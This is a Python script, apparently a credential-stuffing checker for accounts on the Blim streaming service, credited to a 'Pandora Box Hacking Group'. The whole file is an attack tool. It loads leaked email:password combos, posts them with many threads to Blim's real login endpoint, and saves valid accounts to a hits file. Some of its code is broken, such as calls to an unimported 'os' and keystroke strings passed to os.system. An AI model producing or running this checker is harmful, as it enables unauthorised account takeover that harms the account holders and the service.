import requests
import os as a
from bs4 import BeautifulSoup
from random import choice
import multiprocessing
from multiprocessing.dummy import Pool
import colorama
from time import sleep
from colorama import init
init()
from colorama import Fore,Back,Style
lock = multiprocessing.Lock()


banner = """ 
   __              ____                    __ 
  / /  ___ _    __/ / /__ _    _________ _/ /_
 / _ \/ _ \ |/|/ / / / _ \ |/|/ / __/ _ `/ __/
/_//_/\___/__,__/_/_/\___/__,__/\__/\_,_/\__/ 
                                                 """

class good_or_bad(object):
	def tellmewhatis(self,email,password,caso):
		if caso == True:
			lock.acquire()
			print(Fore.BLUE + Back.GREEN+ f"[+]CUENTA VALIDA: {email}:{password}")
			print(f"""BLIM ACCCOUNT
e = {email}
p = {password}		
CHECKER BY PANDORA BOX HACKING GROUP
HOLLOWCAT AND FUCKED UP

""",file=open("Blim_HITS.txt","a"))
			lock.release()
		elif caso == False:
			lock.acquire()
			print(Fore.RED + Back.YELLOW+ f"[-]CUENTA INVALIDA: {email}:{password}")
			print(f"""{email}:{password}""",file=open("bad.txt","a"))
			lock.release()

class post(object):
	def proxies(self):
		pass
	def capture(self):
		pass
	def token(self):
		pass
	def request(self,email,password):
		url = "https://www.blim.com/account/login"
		bad = open("bad.txt","r+")
		good = open("Blim_HITS.txt","r+")
		goods = good.read()
		bads = bad.read()
		req = requests.session()
		stop = "default@gmail.com"
		
		
		if  email in bads:
			os.system("^Z")
			os.system("^C")

			
		elif email  in goods:
			
			os.system("^Z")
			os.system("^C")
		
			
		else:
			param={
			"username":email,
			"password":password

			}
			
			source = req.post(url,data=param,timeout=4)

			if """{"data":{"redirectPath":"\/inicio"},"messages":[]}""" in source.text:
				good_or_bad().tellmewhatis(email,password,caso=True)
				
			else:
				good_or_bad().tellmewhatis(email,password,caso=False)
			
				
			if email in stop:
				sleep(10)
				print("TODAS LAS CUETNAS HAN SIDO PROBADAS")
				os.system("^Z")
				os.system("^C")			


		

class x(object):
	def __init__(self):
		self.combos=[]

		
		
	def load(self):
		file = open("combo.txt").readlines()
		files = [combo.rstrip()for combo in file]
		
		for lines in files:
			combos = lines.split(":")
			self.combos.append(combos)
			(1+1)

	def check(self,acc):
		email = acc[0]
		password = acc[1]
		#print (self.load())
		
		while True:
			try:
				post().request(email,password)
				
				
				
			except  Exception :
				break
	def main(self):
		print("""++++++++++++++++++++CONFIG BY: ++++++++++++++++++""")
		print(Fore.GREEN+Back.BLACK+banner)
		self.load()
		self.threads = 15
		pool = Pool(self.threads)
		for _ in pool.imap(self.check,self.combos):
			pass
if __name__ == '__main__':
	x().main()